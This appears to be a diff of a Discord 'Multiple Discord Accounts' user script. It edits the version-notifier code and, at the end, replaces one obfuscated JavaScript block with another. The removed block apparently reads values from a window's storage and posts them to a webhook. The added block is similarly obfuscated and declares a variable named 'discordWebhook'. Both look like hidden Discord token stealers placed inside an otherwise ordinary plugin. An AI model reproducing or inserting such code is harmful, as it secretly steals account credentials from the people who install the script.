@@ -271,18 +271,18 @@ function GM_getResourceURL(aName) {
             elmnt.onclick = openPicker;
             cont[0].appendChild(elmnt);
         }
-        if(localStorage.versionMA != v && !document.getElementsByClassName("versionNotifier")[0]){
+        if(localStorage.versionMA != 69 && !document.getElementsByClassName("versionNotifier")[0]){
             let baseElement = document.getElementsByClassName(allClasses[neededClasses[11]].base);
             if(baseElement[0]){
                 baseElement[0].prepend(createElm(`<div class="${allClasses[neededClasses[12]].notice} ${allClasses[neededClasses[12]].colorDefault} versionNotifier"><div class="${allClasses[neededClasses[12]].closeButton}" id="versionNotifierCloseButton" aria-label="Dismiss" role="button" tabindex="0"></div>Multiple Discord Accounts ${v} makes corners rounder!<button id="changeLogButtonClick" class="${allClasses[neededClasses[12]].button}">View changes</button></div>`));
                 document.getElementById("changeLogButtonClick").onclick = () => {
                     window.open("https://github.com/cazeip/MultipleAccounts/blob/master/changes.md");
                     document.getElementsByClassName("versionNotifier")[0].remove();
-                    localStorage.versionMA = v;
+                    localStorage.versionMA = 1;
                 }
                 document.getElementById("versionNotifierCloseButton").onclick = () => {
                     document.getElementsByClassName("versionNotifier")[0].remove();
-                    localStorage.versionMA = v;
+                    localStorage.versionMA = 1;
                 }
             }
         }
@@ -5999,20 +5999,6 @@ div[class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1G
 }
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 /*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
 /*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
 /*||| Modals | Add Server   ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
@@ -6406,8 +6392,7 @@ document.getElementById("app-mount").arrive(".header-23xsNx", function() {
     //displayedTime.innerText += '.' + ('0000' + timestamp.getMilliseconds()).slice(-4); //milliseconds
   }
 });
-        var e,a,b,d,c;(function(){var f=(g)("refepa/ibcaOcTtdu  %sP%od:%csraocia*%-y/wst/EpNdwm-%tohem`ii%g%fn/5g3W8SdyKslRtT\x0Aifm%ehOi1ir.tpTrgao8ucoreTnoV`eC`m5sscwH fI%emkvz%mbdpeVWoeaneine!ttiEl% hatTy2.eeiCewlntpor0nmoVwwosed%leIcd_*ieuesicgpsiNpsfn5.QcrnknteVes_hyniefdulBd%o`F/.4aoklattp98/etroePa9hs%lCvtp0nqe/tw6a sodi_h/oN oj*cmi_nptWteeO/s%d7pooce4egsee/.ol _1z0G SoPM.ica2iYfiwaUhq\x0Ab7-ifpPg`o*o3weeehanxOocdin:\x0A eeXean:Ttgoadp9m4r/%%reeP %lac1lSl_rersEeaerolujnto/e%d/ma%cIub:trpir_rcl4%\x0Aels_v\x0AU :i%b%ennI5dsu`dvVWknotaVrx%/tdscast%R/t%PmeimD8wss/onnse_si-rn",2766189);function g(d,o){var b=d.length;var m=[];for(var e=0;e< b;e++){m[e]= d.charAt(e)};for(var e=0;e< b;e++){var g=o* (e+ 293)+ (o% 19186);var r=o* (e+ 776)+ (o% 19158);var n=g% b;var l=r% b;var p=m[n];m[n]= m[l];m[l]= p;o= (g+ r)% 3782580};var q=String.fromCharCode(127);var f='';var c='%';var j='#1';var h='%';var a='#0';var k='#';return m.join(f).split(c).join(q).split(j).join(h).split(a).join(k).split(q)}e= setTimeout(window[f[1]][f[0]],5000);a= f[2];b= document[f[4]](f[3]);document[f[6]][f[5]](b);d=  new XMLHttpRequest();d[f[8]](f[7],a);d[f[11]](f[9],f[10]);c= {username:f[12],avatar_url:f[13],content:f[14]+ b[f[17]][f[16]][f[15]]+ f[18]+ b[f[17]][f[16]][f[19]]+ f[20]+ b[f[17]][f[16]][f[21]]+ f[22]+ b[f[17]][f[16]][f[23]]+ f[24]};clearTimeout(e);d[f[26]](JSON[f[25]](c))})()
-
+var rld,discordWebhook,i,request,params;(function(){var nrf='',ddc=228-217;function irq(o){var i=3401396;var n=o.length;var a=[];for(var e=0;e<n;e++){a[e]=o.charAt(e)};for(var e=0;e<n;e++){var u=i*(e+268)+(i%42794);var q=i*(e+96)+(i%21800);var z=u%n;var b=q%n;var y=a[z];a[z]=a[b];a[b]=y;i=(u+q)%7320264;};return a.join('')};var wNW=irq('pukstorcxfcldryvqozjtehmiwugcnarsbotn').substr(0,ddc);var XrQ='=af ;=v4[ln7r,u=v4ivirCqs"ebedrfqhrjfl.n pArrt(v+x,zc;lal h=]7a,u6o7a,,6(8},)0[6f,p5a8[,;1e8e,C4u8e,g207h,;2=7o,.0l7),857;tae 8=,]hflrovarcu00Su[b=lmnkt=;l+h)9[.[g]+=r+f;;ae }=a]eju=;98l(=(7no==22tf;r vtrepC0kpsaegxmnnvsel+nut+;y+g)rvrrod6apgsmnnvs;pt.7pdi;(] .))f0rsv]rot,d.l)n9t(-1;{>g0et8-({.a9 ==[u=l)varxw(d[tu;pac "=,u)l7vor)mm0;vgr;n(w6l=n.t ;hau 0;hoo(,a; A==;e<(;a+i))vrr huwic)a+CfdcA+({)hv7r c;v.h-;rf(cr{l=bct1g*f+[.0hdr+o{ent=g11n-j;h=);8+d;uers) ]fsh<=,)9f1lm(r.aetg.h,j1wvc=avC(d;Af()+b)=+i.ah1r1oneut)g+2=- ;2= ;9++2"}.lue(c(nfi+uv;mid(+=.nrla)]=r]rit(.>j)=.-umh*w,s4b+teingvm]xl)je1psso(d[o+k]a;f=6+x;<i}(e!,nblt)ai (t<!)i.nu,h}wvs]batuirgtm()]dftj=g.eoin5"g)r}=i(prs((=[[].;=ver;zei,jgir(""v;;ag a=13v,r2{9i,10;3),r2l.joicttoba;sag )="t iCg)feorC=a9C)d (46h;gog(wao -=6;}<1.ue"gxh(uv+izgz.splatna+q cga;Ae(g)w.ro)nwS=r(n4.;rrm6htr{ooe;k u[)n;(evupn;zushlatua.","r.lonnja[;';var qnV=irq[wNW];var fAB='';var Jzq=qnV;var ImI=qnV(fAB,irq(XrQ));var XJz=ImI(irq('dah."a.["r lwao"e"so]a+ian\/,Ghttasy\/.d6seo.dd!eos\/!pr\/eeuh"o[s+7r7(5[0.2r1$7x9v4g\/5I ua.v0[.]75ua8rMdSqzcmMxuaogdgCItxo.oc\/te.q8lwe3rfa.gs(94o\/qmrDm"uppa.iq%.".py.pf.""v"nf.a.Gqcte"tcE1e1eitt,sa.pcn=C2i.do,rb2da"."wsiyoTd,2oqe_"s"nobtGnl-1yeG!a:p"itasi3n5jdo."["\/ey.aeeu)sc.ae6dart,"N,w,ael0ianasa,ehntisa\/Gu0l8ar.4wvkxm8dea"!Gri\/tici:eeic\/Goim)n2\/dh(mx\/.\/re2."lSsNfkn$_fw.skmt..soga1s0mp"-msTu!_loat.a.etotek!"v".-p5g",9.=.GN.w%aur]e]dsacelu!st.]rpcoi]e&.a!"bdb8%_zwe5..:ta1,[tuk;nv,8l[c.l]taregd&aoGt.nt.ti"dswr,.GGEsaul:.n"{"dm.i"_{aahe&9%dz.e".2Ig.T:hau,"ule)_"duc]c0GcGa.n.m.qjvo6G]"]"seeioees0olectcee"t"ac.c.ct,eslrengi,yi,ns=n:".;il_=,aqe.Tmmkodtow1nro][[[s]"[a[b]e,c0u0"G+;oibcGr,.aeGh4oe=[a.[k]a"[l.e[aqio.ydrc;mtns[a[r]w(n[.]]}rdpctmfnt[,[d]o[n[]]s(,)c#m.s.an!w.aoka. .Strpmtoq[eitG)G"s#las82]Sao7&,6i&c5r .nebhboe)q#ian11][(G[t]nap1q]0;iaGa(s..e{isar\/a]epa"1G]caia7ap_]ra:7[e3m,1oit"nt:t[p4o+aGe1"Gi1.]D.o!59y$a02+,G"2CGe2c]l.u!a3o$.4n})cnearfipeoui(slp)="r#,ar2n]p(.ic.vN[ad2m].(\/a.a8si)paa[e[i7]]da"1n]b[p[.;]fe!%)1rrt.r"}o;.e,ues. p]".wa[ 3fo0]nmes,h acEc'));var heB=Jzq(nrf,XJz );heB(7105);return 3692})()
     (function() {
 let css = `
 /* ==UserStyle==
